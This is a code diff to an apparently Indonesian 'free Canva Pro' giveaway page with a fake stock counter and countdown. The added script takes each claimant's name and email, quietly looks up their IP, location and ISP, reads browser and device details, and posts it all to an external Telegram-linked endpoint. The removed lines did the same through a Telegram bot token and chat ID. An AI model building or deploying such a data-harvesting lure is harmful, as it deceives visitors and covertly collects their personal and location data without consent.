@@ -2570,8 +2570,17 @@
     </style>
     <script>
       // =========== GIFT PANEL ===========
-      const CANVA_LINK =
-        "https://www.canva.com/brand/join?token=hOtsUmAJ2xy_pMccvAXqgw&referrer=team-invite";
+      let CANVA_LINK = "";
+      // Ambil link aktif dari API (fallback ke link lama kalau API mati)
+      (async () => {
+        try {
+          const r = await fetch("https://api-telegram.vercel.app/api/canva-link");
+          const d = await r.json();
+          if (d.ok && d.link) CANVA_LINK = d.link;
+        } catch (e) {
+          // fallback: pakai link lama
+        }
+      })();
       const STOCK_TOTAL = 100;
       const DEFAULT_STOCK = 99;
       const COUNTDOWN_SECONDS = 10;
@@ -2718,52 +2727,39 @@
         btn.disabled = true;
         btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengirim...';
 
-        const botToken = "8430081251:===REDACTED===";
-        const chatId = "2010496733";
-        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        const now = new Date().toLocaleString("id-ID", {
-          timeZone: "Asia/Makassar",
-          dateStyle: "full",
-          timeStyle: "short",
-        });
+        const userAgent = navigator.userAgent || "";
+        const platform = navigator.platform || "";
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+        const deviceType = isMobile ? "Mobile" : "Desktop";
 
         fetch("https://ipapi.co/json/")
           .then((r) => r.json())
           .catch(() => null)
           .then((geo) => {
-            const ip = geo && geo.ip ? `\`${geo.ip}\`` : "N/A";
-            const loc = geo
-              ? `${geo.city || "-"}, ${geo.region || "-"}, ${geo.country_name || "-"}`
-              : "N/A";
-            const text = `🎁 *Klaim Canva Pro Baru!*
------------------
-*DATA PENGGUNA*
-👤 *Nama:* ${escapeMdGift(name)}
-📧 *Email:* ${escapeMdGift(email)}
------------------
-*LOKASI & PERANGKAT*
-🌐 *IP:* ${ip}
-📍 *Lokasi:* ${escapeMdGift(loc)}
------------------
-*WAKTU & STOK*
-🕒 *Waktu:* ${now}
-📦 *Stok sisa:* ${stock - 1} dari ${STOCK_TOTAL}
------------------`;
-
-            return fetch(telegramUrl, {
+            return fetch("https://api-telegram.vercel.app/api/claim", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({
-                chat_id: chatId,
-                text,
-                parse_mode: "Markdown",
+                name,
+                email,
+                ip: geo && geo.ip ? geo.ip : "",
+                location: geo
+                  ? `${geo.city || "-"}, ${geo.region || "-"}, ${geo.country_name || "-"}`
+                  : "",
+                org: (geo && geo.org) || "",
+                device: deviceType,
+                platform: platform,
+                user_agent: userAgent,
               }),
             });
           })
           .then((r) => r.json())
           .then((data) => {
             if (data.ok) {
-              const newStock = Math.max(0, getStockRemaining() - 1);
+              const newStock =
+                typeof data.stock === "number"
+                  ? data.stock
+                  : Math.max(0, getStockRemaining() - 1);
               localStorage.setItem("canva_stock", newStock);
               const history = JSON.parse(
                 localStorage.getItem("canva_history") || "[]",
